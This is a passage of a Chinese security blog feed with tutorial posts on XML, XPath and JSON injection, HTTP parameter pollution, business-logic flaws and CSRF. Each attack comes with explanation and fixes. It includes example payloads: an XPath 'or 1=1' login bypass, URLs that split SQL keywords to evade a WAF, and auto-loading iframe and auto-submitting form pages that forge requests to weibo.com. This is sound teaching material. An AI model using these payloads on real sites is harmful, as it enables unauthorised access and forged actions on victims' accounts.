class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>admin</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>666<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manager</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="XML注入原理"><a href="#XML注入原理" class="headerlink" title="XML注入原理"></a>XML注入原理</h3><p>XML注入是通过改写XML实现的，与XSS跨站漏洞相似，漏洞利用成功的关键点是闭合XML标签</p><h3 id="XML注入示例"><a href="#XML注入示例" class="headerlink" title="XML注入示例"></a>XML注入示例</h3><p>假如我们能掌控上文admin.xml中的666字段，那么就会产生XML注入<br>添加一个新管理员guest:<br>攻击者输入:<code>666&lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;name&gt;guest&lt;/name&gt;&lt;password&gt;guest</code><br>最终修改后的XML为</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>manager</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>admin</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>admin</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>666<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>admin</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>guest<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>guest<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>admin</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>manager</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="XML注入时的两大要素"><a href="#XML注入时的两大要素" class="headerlink" title="XML注入时的两大要素"></a>XML注入时的两大要素</h3><ul><li>闭合标签</li><li>获取XML表结构</li></ul><h3 id="XML注入修复"><a href="#XML注入修复" class="headerlink" title="XML注入修复"></a>XML注入修复</h3><p>对预定义字符进行转义</p><ul><li>预定义字符<table><thead><tr><th align="center">预定义字符</th><th align="center">转义后的预定义字符</th></tr></thead><tbody><tr><td align="center">&lt;</td><td align="center">&amp;lt;</td></tr><tr><td align="center">&gt;</td><td align="center">&amp;gt;</td></tr><tr><td align="center">&amp;</td><td align="center">&amp;amp;</td></tr><tr><td align="center">‘</td><td align="center">&amp;apos;</td></tr><tr><td align="center">“</td><td align="center">&amp;quot;</td></tr></tbody></table></li></ul><h2 id="XPath注入"><a href="#XPath注入" class="headerlink" title="XPath注入"></a>XPath注入</h2><h3 id="XPath简介"><a href="#XPath简介" class="headerlink" title="XPath简介"></a>XPath简介</h3><p>XPath,XML路径语言(XML Path Language）<br>XPath基于XML的树状结构，提供在数据结构树中找寻节点的能力<br>简单的说，XPath就是选取XML节点的一门语言</p><h3 id="XPath基础语法"><a href="#XPath基础语法" class="headerlink" title="XPath基础语法"></a>XPath基础语法</h3><p>XPath使用路径表达式在XML文档中选取节点</p><table><thead><tr><th align="center">符号</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">&#x2F;</td><td align="center">从根节点选取</td></tr><tr><td align="center">&#x2F;&#x2F;</td><td align="center">从匹配选择的当前节点选择文档中的节点</td></tr><tr><td align="center">.</td><td align="center">选取当前节点</td></tr><tr><td align="center">..</td><td align="center">选取当前节点的父节点</td></tr><tr><td align="center">@</td><td align="center">选取属性</td></tr><tr><td align="center">*</td><td align="center">通配符。选择所有的元素，与元素名无关</td></tr><tr><td align="center">@*</td><td align="center">属性通配符。选择所有的属性，与名称无关</td></tr><tr><td align="center">:</td><td align="center">属性通配符。选择所有的属性，与名称无关</td></tr><tr><td align="center">()</td><td align="center">为运算分组，明确设置优先级</td></tr><tr><td align="center">[]</td><td align="center">应用筛选模式</td></tr></tbody></table><h3 id="XPath注入-1"><a href="#XPath注入-1" class="headerlink" title="XPath注入"></a>XPath注入</h3><p>XPath最强大的功能在于逻辑运算，如果使用不当，将会造成注入漏洞</p><ul><li>XPath逻辑运算符<table><thead><tr><th align="center">运算符</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">or</td><td align="center">或</td></tr><tr><td align="center">and</td><td align="center">与</td></tr></tbody></table></li></ul><p>通过XPath注入攻击，攻击者可以攻击XML。<br>XPath注入与SQL注入类似</p><ul><li>SQL注入<br><code>select * from admin where id=1 or 1=1</code><br>会列出当前表admin中的所有数据</li><li>XPath注入<br>SQL语句中的admin表相当于XML文件<br>XML文件内容为<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>guest<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>guest<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>在查询时，正常的XPath语句<br><code>//user[username/text()=&#39;root&#39; and password/text()=&#39;root&#39;]</code><br>语句含义：查询user节点(任意位置)下的username标签的值为root,并且password标签的值也为root。如果存在，则返回当前节点<br>假设我们可以控制XPath语句，则<br>在查询时，XPath注入语句<br><code>//user[username/text()=&#39;&#39; or 1=1 or &#39;&#39;=&#39;&#39; and password/text()=&#39;&#39; or &#39;1&#39;=&#39;1&#39;]</code><br>即可遍历全部节点</li></ul><h3 id="XPath注入防御"><a href="#XPath注入防御" class="headerlink" title="XPath注入防御"></a>XPath注入防御</h3><ul><li>对于一些敏感信息，不要使用XML传输。如果一定要使用XML，则尽量使用密文传输</li><li>对预定义字符进行转换</li></ul><h2 id="JSON注入"><a href="#JSON注入" class="headerlink" title="JSON注入"></a>JSON注入</h2><h3 id="JSON简介"><a href="#JSON简介" class="headerlink" title="JSON简介"></a>JSON简介</h3><p>JSON(JavaScript Object Notation),是一种轻量级的数据交换格式<br>JSON基于JavaScript的一个子集<br>JSON采用完全独立于语言的文本格式，但是也使用了类似于C语言家族的习惯(c,c++,c#，java,perl,python等语言都可以使用json），这些特性使json成为理想的数据交换语言，易于开发人员阅读与编写，同时也易于程序解析与生成<br>JSON可以将JavaScript中的对象转换为字符串，然后在函数，网络之间传递这个字符串。JavaScript能很容易的解释这个字符串</p><h3 id="JSON示例"><a href="#JSON示例" class="headerlink" title="JSON示例"></a>JSON示例</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"password"</span><span class="token punctuation">,</span><span class="token property">"email"</span><span class="token operator">:</span><span class="token string">"388484@qq.com"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"users"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"password"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token string">"2"</span><span class="token punctuation">,</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"root"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"guest"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"guest"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="JSON注入-1"><a href="#JSON注入-1" class="headerlink" title="JSON注入"></a>JSON注入</h3><p>JSON是根据<code>&quot;</code>(双引号)<code>:</code>(冒号)<code>,</code>(逗号)<code>&#123;&#125;</code>(花括号)来区分各字符的意义的<br>JSON注入是指恶意用户向JSON中注入恶意字符，导致JSON结构被破坏，导致JSON解析失败</p><ul><li>JSON注入示例<br>正常的JSON<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"123"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>假如我们可以控制password字段的输入，输入：<code>666&quot;666</code><br>JSON注入后的JSON<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"id"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"666"</span><span class="token number">666</span>"<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>可见，JSON的结构被破坏，导致该json无法被解析</li></ul><h3 id="JSON注入防御"><a href="#JSON注入防御" class="headerlink" title="JSON注入防御"></a>JSON注入防御</h3><ul><li>对关键字符进行转义,如：<code>&quot;</code>转义为<code>\&quot;</code>,<code>\</code>转义为<code>\\</code>等</li><li>使用一些第三方组件，如JAVA的JSON-lib.jar，可以有效避免JSON注入</li></ul><h2 id="HTTP参数污染-HPP"><a href="#HTTP参数污染-HPP" class="headerlink" title="HTTP参数污染(HPP)"></a>HTTP参数污染(HPP)</h2><h3 id="HTTP参数污染简介"><a href="#HTTP参数污染简介" class="headerlink" title="HTTP参数污染简介"></a>HTTP参数污染简介</h3><p>HTTP参数污染(HTTP Parameter Pollution），简称HPP。它就是web容器处理HTTP参数的问题</p><h3 id="HTTP参数污染原理"><a href="#HTTP参数污染原理" class="headerlink" title="HTTP参数污染原理"></a>HTTP参数污染原理</h3><p>php源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>开发人员通常不会考虑有重复参数的问题，因为它比较少见。HTTP请求中也并未规定不可以传递多个相同的参数项<br>因此构造URL<code>http://www.example.com/index.php?id=1&amp;id=2&amp;id=3</code><br>显示结果为</p><img src="/2022/03/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93.png" class=""><p>可以发现，php在取值时忽略了前面的id的值，只取了最后一个id参数的值<br>这就是HTTP参数污染<br>注：这仅是php的取值结果，而不同脚本环境的取值结果是不同的</p><ul><li>不同脚本环境HPP的执行结果<img src="/2022/03/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E4%B8%8D%E5%90%8C%E8%84%9A%E6%9C%AC%E7%8E%AF%E5%A2%83.png" class="">例：<br>JSP：<code>http://www.example.com/index.jsp?id=1&amp;id=2&amp;id=3</code>,取值为第一个id参数的值1<br>ASP.NET:<code>http://www.example.com/index.aspx?id=1&amp;id=2&amp;id=3</code>,取值为123（ASP.NET会将多个相同参数项的值连接起来)</li></ul><h3 id="HTTP参数污染应用"><a href="#HTTP参数污染应用" class="headerlink" title="HTTP参数污染应用"></a>HTTP参数污染应用</h3><p>用来绕过一些web应用防火墙(waf)</p><ul><li><p>waf工作原理简介<br>客户端发送请求，waf在接收到请求数据之后就对数据进行校验。如果未发现恶意代码，则交给服务器端脚本去处理；如果发现恶意代码，就进行拦截，不再交给服务器端脚本去处理</p></li><li><p>HPP绕waf的原理<br>因为HPP有多个相同的参数项，而waf和服务器端脚本的取值不同，如<br>PHP:<code>http://www.example.com/index.php?id=1&amp;id=select username,password from admin -- </code><br>waf取id值为<code>1</code>，而php取id值为<code>select username,password from admin -- </code>,由于<code>1</code>无恶意代码，所以该请求数据不会被waf拦截<br>ASP.NET:<code>http://www.example.com/index.aspx?id=1;&amp;id=s&amp;id=e&amp;id=l&amp;id=e&amp;id=c&amp;id=t</code><br>waf取id值为<code>1;</code>,而asp.net取id值为<code>1;select</code>,由于<code>1;</code>无恶意代码，所以该请求数据不会被waf拦截</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>逻辑错误漏洞</title>
      <link href="/2022/03/11/%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/03/11/%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="逻辑错误漏洞"><a href="#逻辑错误漏洞" class="headerlink" title="逻辑错误漏洞"></a>逻辑错误漏洞</h1><h2 id="逻辑错误漏洞简介"><a href="#逻辑错误漏洞简介" class="headerlink" title="逻辑错误漏洞简介"></a>逻辑错误漏洞简介</h2><p>逻辑错误漏洞是指由于程序逻辑不严谨或逻辑太复杂导致一些逻辑分支不能正常处理或处理错误<br>逻辑漏洞一般出现在功能(业务流程)上，漏扫工具无法识别</p><h2 id="逻辑漏洞挖掘步骤"><a href="#逻辑漏洞挖掘步骤" class="headerlink" title="逻辑漏洞挖掘步骤"></a>逻辑漏洞挖掘步骤</h2><ul><li>发现网站所提供的功能模块，如:修改密码，密码找回，修改个人资料等功能</li><li>针对具体的功能确定业务流程<br>例：购物功能的业务流程如下:<pre class="line-numbers language-none"><code class="language-none">1.挑选商品，商品可多选；2.立刻购买，在“立刻购买”按钮旁边可以选择购买数量，购买样式等；3.显示购买信息，在此步骤可以给卖家留言，填写购买数量，使用优惠券，匿名购买，找人代付等；4.提交订单；5.付款；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>拦截HTTP&#x2F;HTTPS请求，分析其参数项的含义</li><li>修改参数值，尝试触发逻辑漏洞</li><li>用同样的方法对其他功能继续测试</li></ul><h2 id="挖掘逻辑漏洞的重点"><a href="#挖掘逻辑漏洞的重点" class="headerlink" title="挖掘逻辑漏洞的重点"></a>挖掘逻辑漏洞的重点</h2><ul><li>业务流程</li><li>HTTP&#x2F;HTTPS请求篡改</li></ul><h2 id="常见的逻辑漏洞"><a href="#常见的逻辑漏洞" class="headerlink" title="常见的逻辑漏洞"></a>常见的逻辑漏洞</h2><h3 id="越权-绕过授权验证"><a href="#越权-绕过授权验证" class="headerlink" title="越权(绕过授权验证)"></a>越权(绕过授权验证)</h3><p>指访问了没有授权的资源或信息</p><h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p>水平越权就是相同级别(权限)的用户或者同一角色的不同用户之间，可以越权访问，修改，删除的非法操作</p><h5 id="水平越权示例"><a href="#水平越权示例" class="headerlink" title="水平越权示例"></a>水平越权示例</h5><p>无水平越权漏洞，只能查看自己(id&#x3D;1）的个人信息：<br><code>http://www.example.com/userinfo.php?id=1</code><br>存在水平越权漏洞，能查看别人的个人信息:<br><code>http://www.example.com/userinfo.php?id=6</code></p><h5 id="水平越权危害"><a href="#水平越权危害" class="headerlink" title="水平越权危害"></a>水平越权危害</h5><p>可能会造成大批量数据泄漏，严重的甚至会造成用户信息被恶意篡改</p><h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p>垂直越权是不同级别之间或不同角色之间的越权</p><h5 id="垂直越权分类"><a href="#垂直越权分类" class="headerlink" title="垂直越权分类"></a>垂直越权分类</h5><ul><li>向上越权</li><li>向下越权</li></ul><h3 id="密码找回逻辑漏洞"><a href="#密码找回逻辑漏洞" class="headerlink" title="密码找回逻辑漏洞"></a>密码找回逻辑漏洞</h3><p>为了防止用户遗忘密码，大多数网站都提供了找回密码功能<br>常见的找回密码方式:邮箱找回密码，根据密保问题找回密码，手机号找回密码等<br>无论是哪种密码找回方式，在找回密码时，如果不仅能找回自己的密码，还能找回其他用户的密码，就存在密码找回漏洞</p><h3 id="支付逻辑漏洞"><a href="#支付逻辑漏洞" class="headerlink" title="支付逻辑漏洞"></a>支付逻辑漏洞</h3><h4 id="测试支付逻辑漏洞的重点"><a href="#测试支付逻辑漏洞的重点" class="headerlink" title="测试支付逻辑漏洞的重点"></a>测试支付逻辑漏洞的重点</h4><ul><li>业务流程</li><li>HTTP请求分析(购买数量，商品价格，折扣，运费，商品信息的中转页面，跳转到支付接口时等参数)</li></ul><h4 id="支付逻辑漏洞示例"><a href="#支付逻辑漏洞示例" class="headerlink" title="支付逻辑漏洞示例"></a>支付逻辑漏洞示例</h4><ul><li>商品数量为负数</li><li>0元购买商品</li><li>商品价格修改</li><li>物流运费修改等</li></ul><h3 id="指定账户恶意攻击"><a href="#指定账户恶意攻击" class="headerlink" title="指定账户恶意攻击"></a>指定账户恶意攻击</h3><p>针对安全性较高的系统，当该类系统使用账号密码登陆时，如果密码输入次数超过规定次数，就会锁定当前账户，从而在一定的时间内无法登陆。<br>攻击者可利用该逻辑漏洞对某账号恶意攻击导致其无法使用</p><ul><li>防御方法<br>不要暴露登陆账户，对外仅仅暴露昵称</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF漏洞</title>
      <link href="/2022/03/07/CSRF%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/03/07/CSRF%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h1><h2 id="CSRF漏洞简介"><a href="#CSRF漏洞简介" class="headerlink" title="CSRF漏洞简介"></a>CSRF漏洞简介</h2><p>CSRF(Cross-Site Request Forgery),跨站请求伪造。也被称为”One Click Attack”或者”Session Riding”。通常缩写为CSRF或XSRF<br>CSRF的攻击方式与XSS完全不同，CSRF比XSS更具危险性<br>简单理解CSRF漏洞：攻击者盗用了你的身份，以你的名义进行某些非法操作,如:使用你的账户发送邮件，获取你的敏感信息，非法转账等</p><h2 id="CSRF攻击原理"><a href="#CSRF攻击原理" class="headerlink" title="CSRF攻击原理"></a>CSRF攻击原理</h2><p>当我们登陆某个网站后，浏览器与网站所存放的服务器将会建立一个经过认证的会话，在这个会话没有结束时，你就可以利用你的权限对网站进行某些操作(通过经过认证的会话发送请求给服务器，服务器则认为该请求是可信的)，如:发表文章等。当这个会话结束后，你就没有权限对网站进行相关操作(没有通过经过认证的会话发送请求，服务器认为该请求不可信)，网站可能会提示你:”您的会话已过期”,”请重新登陆”等<br>注:CSRF攻击是攻击者借助受害者的cookie骗取服务器的信任，但是攻击者并不能获取到cookie,也看不到cookie的内容。另外，由于浏览器同源策略的限制，攻击者无法从返回的结果中得到任何东西，CSRF所能做的就是给服务器发送请求</p><h2 id="CSRF攻击重点"><a href="#CSRF攻击重点" class="headerlink" title="CSRF攻击重点"></a>CSRF攻击重点</h2><ul><li>CSRF攻击建立在浏览器与web服务器的会话中</li><li>欺骗用户访问URL，如：转账的URL</li></ul><h2 id="CSRF攻击方式"><a href="#CSRF攻击方式" class="headerlink" title="CSRF攻击方式"></a>CSRF攻击方式</h2><ul><li>首先确保用户登陆了某网站</li><li>然后给用户发送对该网站进行某些操作的URL,诱导用户点击。</li></ul><h2 id="CSRF攻击场景"><a href="#CSRF攻击场景" class="headerlink" title="CSRF攻击场景"></a>CSRF攻击场景</h2><ul><li><p>GET<br>示例:<br>创建get.html:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>自动加载url<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.weibo.com/listen?listenid=666<span class="token punctuation">"</span></span> <span class="token attr-name">frameborder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0px<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>   #订阅某人<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.weibo.com/publish?id=999<span class="token punctuation">"</span></span> <span class="token attr-name">frameborder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0px<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>  #转发文章<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只要受害者打开get.html,就会自动加载iframe标签中的两条URL，就达到了自动化攻击的目的</p></li><li><p>POST<br>示例:<br>创建post.html</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>自动加载url<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>myform<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.weibo.com/publish<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>listenid<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>666<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> form<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myform"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>form<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token 